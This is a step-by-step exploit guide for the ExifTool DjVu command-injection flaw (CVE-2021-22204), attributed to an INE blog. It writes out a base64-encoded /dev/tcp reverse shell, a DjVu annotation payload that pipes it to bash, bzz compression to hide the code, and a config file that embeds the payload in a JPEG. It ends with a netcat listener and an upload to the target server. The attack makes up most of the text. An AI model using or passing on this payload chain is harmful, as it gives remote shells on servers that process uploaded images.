Introduction:

Improper neutralization of user data in the Djvu file format in Exiftool version up to 12.23 allows arbitrary code execution when parsing the malicious image. Simply upload a malicious image to the website or server in order to create a reverse shell connection 

Commands:

Create a tcp reverse shell and encode in base64 format:

$echo ‘sh -i >& /dev/tcp/<lhost>/<lport> 0>&1' | base64

Create a payload file: 

	$cat payload
(metadata "\c${system('echo <base64_format_shell> | base64 -d | bash')};")

Compress the payload file to obfuscate the code

$bzz payload payload.bzz

Making .djvu file using djvumake utility
	
	It will execute id command when someone tries to analyze it with Exiftool.

$djvumake exploit.djvu INFO='1,1' BGjp=/dev/null ANTz=payload.bzz

# INFO = Anything in the format 'N,N' where N is a number 
# BGjp = Expects a JPEG image, but we can use /dev/null to use nothing as a  background image 
# ANTz = Will write the compressed annotation chunk with the input file 

Check the malicious file behavior 

$exiftool exploit.djvu



Exiftool version 12.23 is vulnerable to command Injection vulnerability. It successfully executed the command id while analyzing the exploit.djvu file using the Exiftool. 
Create a config file to convert .djvu file to .jpg file

	$cat configfile
	
%Image::ExifTool::UserDefined = (
    		#All EXIF tags are added to the Main table, and WriteGroup is used to
    		#specify where the tag is written (default is ExifIFD if not specified):
    		'Image::ExifTool::Exif::Main' => {
        			Example 1.  EXIF:NewEXIFTag
      		 	0xc51b => {
            			Name => 'HasselbladExif',
            			Writable => 'string',
            			WriteGroup => 'IFD0',
       			 },
        			# add more user-defined EXIF tags here...
   		 },
);
1; #end%


Convert the .djvu file into .jpg file 

$exiftool -config configfile '-HasselbladExif<=exploit.djvu' <image.jpeg>

# configfile = The name of our configuration file
# -HasselbladExif = Tag name that are specified in the config file  
# exploit.djvu = Our exploit, previously made with djvumake

Start the netcat listener on the same <lport> port and upload an image file.
	nc -lvp <lport>

Conclusion: 

It successfully exploited exiftool's vulnerability (Exiftool’s mishandling of Djvu files) that allows an after to perform a command injection using a malicious image. 



Ine. (n.d.). Exiftool Command Injection (CVE-2021-22204). INE. https://ine.com/blog/exiftool-command-injection-cve-2021-22204

